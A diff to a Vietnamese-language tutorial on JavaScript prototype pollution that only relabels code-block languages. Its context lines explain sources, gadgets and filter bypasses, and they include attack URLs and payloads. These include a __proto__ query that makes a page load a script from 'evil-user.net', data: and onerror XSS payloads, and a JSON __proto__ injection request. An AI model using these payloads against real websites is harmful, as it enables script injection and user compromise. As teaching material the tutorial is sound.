@@ -34,7 +34,7 @@ Trong phần này, chúng ta sẽ nói một cái nhìn tổng quan cơ bản v�
 ### Đối tượng trong Javascript là gì?
 Một đối tượng Javascript về cơ bản chỉ là một tập hợp các cặp `key:value` được gọi là `thuộc tính`.
 Ví dụ: đối tượng sau đại diện cho người dùng.
-```
+```js
 const user =  {
     username: "wiener",
     userId: 01234,
@@ -43,14 +43,14 @@ const user =  {
 ```
 
 Ta có thể truy cập các thuộc tính của một đối tượng bằng cách sử dụng ký hiệu dấu chấm hoặc ký hiệu ngoặc vuông để chỉ các key tương ứng.
-```
+```js
 user.username     // "wiener"
 user['userId']    // 01234
 ```
 
 Cũng giống như dữ liệu, các thuộc tính có thể chứa các hàm thực thi. Trong trường hợp này, hàm được gọi là `phương thức`.
 
-```
+```js
 const user =  {
     username: "wiener",
     userId: 01234,
@@ -72,7 +72,7 @@ Ví dụ: Các chuỗi được tự động gán phần mở rộng `String.pro
 
 
 Một số ví dụ về prototype global:
-```
+```js
 let myObject = {};
 Object.getPrototypeOf(myObject);    // Object.prototype
 
@@ -105,7 +105,7 @@ Với các đối tượng sau, `myObject.propertyA` cho phép tham chiếu:
 
 Bạn có thể sử dụng `console` trình duyệt của mình để xem hành vi này đang hoạt động. Đầu tiên, tạo một đối tượng hoàn toàn trống rỗng:
 
-```
+```js
 let myObject = {};
 ```
 
@@ -139,13 +139,13 @@ Nếu đã quen thuộc với các ngôn ngữ hướng đối tượng, thì th
 {: .notice--info}
 
 Như bất kỳ thuộc tính nào, có thể truy cập `__proto__` bằng ký hiệu dấu ngoặc hoặc dấu chấm
-```yaml
+```js
 username.__proto__
 username['__proto__']
 ```
 
 Cũng có thể xâu chuỗi các tham chiếu để `__proto__` thực hiện theo cách của mình trong chuỗi nguyên mẫu.
-```yaml
+```js
 username.__proto__                        // String.prototype
 username.__proto__.__proto__              // Object.prototype
 username.__proto__.__proto__.__proto__    // null
@@ -158,7 +158,7 @@ Thông thường , điều này được coi là một cách làm không tốt, 
 
 Ví dụ: Javascript hiện đại cung cấp phương thức `strim()` cho các chuỗi, cho phép dễ dàng xóa mọi khoảng trắng ở đầu hoặc cuối một chuỗi. Trước khi phương thức tích hợp sẵn này được giới thiệu, các nhà phát triển thường phải tùy chỉnh đối với đối tượng `String.prototype` bằng cách thực hiện sau:
 
-```yaml
+```js
 String.prototype.removeWhitespace = function(){
     // remove leading and trailing whitespace
 }
@@ -166,7 +166,7 @@ String.prototype.removeWhitespace = function(){
 
 Nhờ kế thừa nguyên mẫu, tất cả các chuỗi sau đó sẽ có quyền truy cập vào phương thức này:
 
-```yaml
+```js
 let searchTerm = "  example ";
 searchTerm.removeWhitespace();    // "example"
 ```
@@ -187,7 +187,7 @@ Có thể làm ô nhiễm bất kỳ đối tượng nguyên mẫu nào, nhưng 
 
 ## Nguồn ô nhiễm nguyên mẫu
 Nguồn gây ô nhiễm nguyên mẫu là bất kì đầu vào nào do người dùng kiểm soát cho phép thêm các thuộc tính tùy ý vào các đối tượng nguyên mẫu. Các nguồn phổ biến nhất như:
-```yaml
+```markdown
 - URL thông qua truy vấn hoặc fragment string (hash)
 - Đầu vào dựa trên JSON
 - Tin nhắn web
@@ -196,7 +196,7 @@ Nguồn gây ô nhiễm nguyên mẫu là bất kì đầu vào nào do người
 ### Ô nhiễm nguyên mẫu qua URL
 
 Ví dụ về một URL, chứa chuỗi truy vấn do kẻ tấn công tạo ra:
-```yaml
+```markdown
 https://vulnerable-website.com/?__proto__[evilProperty]=payload
 ```
 {: .notice--info}
@@ -206,7 +206,7 @@ Khi chia chuỗi truy vấn thành từng cặp `key:value` , trình phân tích
 Nhưng điều gì xảy ra nếu cặp `key:value` này được kết hợp vào một đối tượng đang có dưới dạng thuộc tính.
 
 Ta có thể nghĩ rằng thuộc tính `__proto__` cùng với thuộc tính lồng nhau của nó là `evilProperty` sẽ chỉ được thêm vào đối tượng đích như dưới đây:
-```yaml
+```js
 {
     existingProperty1: 'foo',
     existingProperty2: 'bar',
@@ -238,7 +238,7 @@ Thật thú vị, `JSON.parse` cũng coi bất kỳ khóa nào trong đối tư�
 Ví dụ:
 
 Kẻ tấn công tiêm JSON độc hại sau qua một web messenge
-```yaml
+```markdown
 {
     "__proto__": {
         "evilProperty": "payload"
@@ -249,7 +249,7 @@ Kẻ tấn công tiêm JSON độc hại sau qua một web messenge
 
 Nếu điều này được chuyển đổi thành một đối tượng Javascript thông qua phương thức `JSON.parse()`, thì trên thực tế, đối tượng kết quả sẽ có một thuộc tính với khóa `__proto__`:
 
-```yaml
+```js
 const objectLiteral = {__proto__: {evilProperty: 'payload'}};
 const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
 
@@ -277,12 +277,12 @@ Một thuộc tính không được gọi là `gadget` nếu nó được xác �
 
 ### Ví dụ: Gadget ô nhiễm nguyên mẫu
 Có nhiều thư viện Javascript chấp nhận một đối tượng mà nhà phát triển có thể sử dụng để đặt các tùy chọn cấu hình khác nhau. Mã thư viện kiểm tra xem nhà phát triển có thêm một số thuộc tính nhất định vào đối tượng này một cách rõ ràng hay không và nếu có, điều chỉnh cấu hình cho phù hợp. Nếu không có thuộc tính đại diện cho một tùy chọn cụ thể, thì một tùy chọn mặc định được xác định trước thường được sử dụng để thay thế. Một ví dụ đơn giản hóa có thể trông giống nhưu sau:
-```yaml
+```js
 let transport_url = config.transport_url || defaults.transport_url;
 ```
 
 Bây giờ hãy tưởng tượng code thư viện sử dụng dòng code `transport_url` để thêm tham chiếu tập lệnh vào trang.
-```yaml
+```js
 let script = document.createElement('script');
 script.src = `${transport_url}/example.js`;
 document.body.appendChild(script);
@@ -294,12 +294,12 @@ Trong trường hợp, kẻ tấn công có thể làm ô nhiễm `Object.protot
 {: .notice--info}
 
 Ví dụ: Nếu nguyên mẫu có thể bị ô nhiễm thông qua tham số truy vấn, thì kẻ tấn công chỉ cần dụ nạn nhân truy cập vào một URL được tạo đặc biệt để khiến trình duyệt của họ import tệp Javascript độc hại từ miền do kẻ tấn công kiểm soát
-```yaml
+```markdown
 https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
 ```
 
 Ngoài ra, bằng cách cung cấp một từ khóa `data:` trong url, kẻ tấn công cũng có thể nhúng trực tiếp một payload XSS trong chuỗi truy vấn sau:
-```yaml
+```markdown
 https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
 ```
 
@@ -326,7 +326,7 @@ Ví dụ: `vulnerable-website.com/?__proto__[foo]=bar`
 - Trong console web, kiểm tra xem đối tượng `Object.prototype` đã bị ô nhiễm thành công với thuộc tính tùy ý chưa:
 
 
-```
+```js
 Object.prototype.foo
 // "bar" indicates that you have successfully polluted the prototype
 // undefined indicates that the attack was not successful
@@ -337,7 +337,7 @@ Object.prototype.foo
 
 
 Ví dụ: sử dụng dấu chấm thay vì dùng ký hiệu ngoặc vuông và ngược lại:
-```
+```markdown
 vulnerable-website.com/?__proto__.foo=bar
 ```
 {: .notice--info}
@@ -364,7 +364,7 @@ Trong thực tế, khuyến khích sử dụng DOM Invader để thực hiện v
 3. Thêm một câu lệnh `debugger` ở đầu script, sau đó chuyển tiếp mọi request và phản hồi còn lại.
 4. Trong trình duyệt Burp, truy cập trang mà script đích được tải. Câu lệnh `debugger` tạm dừng việc thực thi tập lệnh.
 5. Trong khi tập lệnh vẫn đang tạm dừng, hãy chuyển sang `console` và nhập lệnh dưới đây, thay thế `YOUR-PROPERTY` bằng một thuộc tính mà bạn cho là một `gadget` tiềm năng.
-```
+```js
 Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
     get() {
         console.trace();
@@ -398,20 +398,20 @@ Trừ khi nguyên mẫu của nó được đặt thành `null`.
 Mọi đối tượng Javascript đều có một thuộc tính `constructor` chứa tham chiếu đến hàm tạo được sử dụng để tạo ra chính đối tượng đó. 
 
 Ví dụ: bạn có thể tạo một Object mới bằng cách sử dụng cú pháp bằng chữ hoặc bằng cách gọi hàm tạo `Object()` 
-```
+```js
 let myObjectLiteral = {};
 let myObject = new Object();
 ```
 {: .notice--info}
 
 Sau đó , ta có thể tham chiếu hàm tạo `Object()` thông qua thuộc tính tích hợp sẵn `constructor`:
-```
+```js
 myObjectLiteral.constructor            // function Object(){...}
 myObject.constructor                   // function Object(){...}
 ```
 
 Nhớ rằng: các hàm cũng chỉ là các Object. Mỗi hàm tạo có một thuộc tính `prototype` trỏ đến nguyên mẫu sẽ được gán cho bất kỳ đối tượng nào được tạo ra bởi constructor đó. Do đó , bạn cũng có thể truy cập nguyên mẫu của bất kỳ đối tượng nào như sau:
-```
+```js
 myObject.constructor.prototype        // Object.prototype
 myString.constructor.prototype        // String.prototype
 myArray.constructor.prototype         // Array.prototype
@@ -423,12 +423,12 @@ myArray.constructor.prototype         // Array.prototype
 
 ## Bypass bộ lọc `__proto__`
 Đương nhiên là các trang web sẽ được lập trình để bỏ qua lỗ hổng ô nhiễm nguyên mẫu. Điều đầu tiên họ nghĩ tới là làm sạch các key trước khi hợp nhất chúng vào một đối tượng hiện có. Tuy nhiên, một lỗi phổ biến là không làm sạch chuỗi đầu vào theo cách đệ quy. Ví dụ: xem xét URL sau:
-```
+```markdown
 vulnerable-website.com/?__pro__proto__to__.gadget=payload
 ```
 
 Nếu quy trình vệ sịnh chỉ tách chuỗi `__proto__` mà không lặp lại quy trình này nhiều lần, thì payload trên vẫn thành công gây ra ô nhiễm nguyên mẫu
-```
+```markdown
 vulnerable-website.com/?__proto__.gadget=payload
 ```
 {: .notice--info}
@@ -446,7 +446,7 @@ Phương thức `fetch()` chấp nhận 2 đối số:
 - Một object tùy chọn cho phép kiểm soát Header request như method, body, ...
 
 Ví dụ: 
-```
+```js
 fetch('https://normal-website.com/my-account/change-email', {
     method: 'POST',
     body: 'user=carlos&email=carlos%40ginandjuice.shop'
@@ -458,7 +458,7 @@ Trong trường hợp này, nếu kẻ tấn công tìm thấy một `source` ph
 Điều này sau đó có thể được kế thừa bởi đối tượng tùy chọn được truyền vào `fetch()` và sau đó được sử dụng để tạo request.
 
 Ví dụ: Đoạn mã sau có khả năng dễ bị tấn công DOM XSS thông qua prototype pollution
-```
+```js
 fetch('/my-products.json',{method:"GET"})
     .then((response) => response.json())
     .then((data) => {
@@ -479,7 +479,7 @@ fetch('/my-products.json',{method:"GET"})
 
 Khai thác:
 Kẻ tấn công có thể gây ô nhiễm bằng cách thêm nội dung độc hại vào thuộc tính `x-username` của đối tượng `headers` như sau:
-```
+```js
 ?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
 ```
 {: .notice--info}
@@ -490,7 +490,7 @@ Giả sử, tiêu đề `x-username` được sử dụng để đặt giá tr�
 
 ### prototype pollution via Object.defineProperty()
 Với một dev chuyên nghiệp họ có thể cố gắng chặn các gadget tiềm bằng bằng cách sử dụng phương pháp `Object.defineProperty()`. Điều này cho phép bạn đặt thuộc tính không thể định cấu hình, không thể ghi trực tiếp lên đối tượng như sau:
-```
+```js
 Object.defineProperty(vulnerableObject, 'gadgetProperty', {
     configurable: false,
     writable: false
@@ -569,7 +569,7 @@ Trong cả hai trường hợp, nếu ứng dụng sau đó bao gồm các thu�
 các request `POST` và `PUT` gửi JSON là một trong những vị trí chính cho loại hành vi này vì thông thường server sẽ phản hồi bằng một JSON của đối tượng mới hoặc đối tượng được cập nhật. 
 
 Ta có thể khai thác như sau:
-```yaml
+```js
 POST /user/update HTTP/1.1
 Host: vulnerable-website.com
 ...
@@ -584,7 +584,7 @@ Host: vulnerable-website.com
 ```
 
 Nếu trang web sẽ bị tấn công thì thuộc tính được thêm vào sẽ xuất hiện trong phản hồi:
-```yaml
+```js
 HTTP/1.1 200 OK
 ...
 {
@@ -611,7 +611,7 @@ Ta sẽ xem xét 3 phương pháp, các cách này đều không dẫn tới s�
 các framework Javascript như Express cho phép các nhà phát triển đặt trạng thái phản hồi HTTP tùy chỉnh. Trong trường hợp đó, máy chủ có thể đưa ra phản hồi HTTP chung, nhưng bao gồm một đối tượng lỗi ở định dạng JSON trong phần nội dung. 
 
 Ví dụ: 
-```yaml
+```js
 HTTP/1.1 200 OK
 ...
 {
@@ -625,7 +625,7 @@ HTTP/1.1 200 OK
 
 Mô-đun Nodejs `http-errors` chứa chức năng để tạo loại phản hồi lỗi này:
 
-```yaml
+```js
 function createError () {
     //...
     if (type === 'object' && arg instanceof Error) {
